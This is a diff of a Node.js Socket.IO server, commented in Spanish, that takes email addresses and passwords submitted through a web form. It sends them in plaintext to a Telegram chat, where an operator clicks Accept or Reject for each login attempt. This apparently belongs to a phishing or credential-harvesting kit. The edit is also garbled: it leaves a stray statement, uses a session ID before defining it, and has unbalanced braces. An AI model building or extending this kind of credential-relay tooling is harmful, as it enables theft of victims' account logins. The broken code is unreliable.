@@ -28,26 +28,33 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
-  socket.on('dataForm', ({ correo, contrasena }) => {
-    const sessionId = uuidv4(); // Crear ID único para esta sesión
+ ; // Crear ID único para esta sesión
     activeSockets.set(sessionId, socket); // Guardar el socket usando sessionId
 
     const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
 
-    const botones = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
-            { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
-          ]
-        ]
-      }
-    };
+  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
+  activeSockets.set(sessionId, socket);
 
-    bot.sendMessage(telegramChatId, mensaje, botones);
-  });
+  const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+  const botones = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
+          { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
+        ]
+      ]
+    }
+  };
+
+  bot.sendMessage(telegramChatId, mensaje, botones);
 });
+socket.on('reconectar', (sessionId) => {
+  activeSockets.set(sessionId, socket);
+});
+
+
 
 bot.on('callback_query', (query) => {
   const data = query.data;
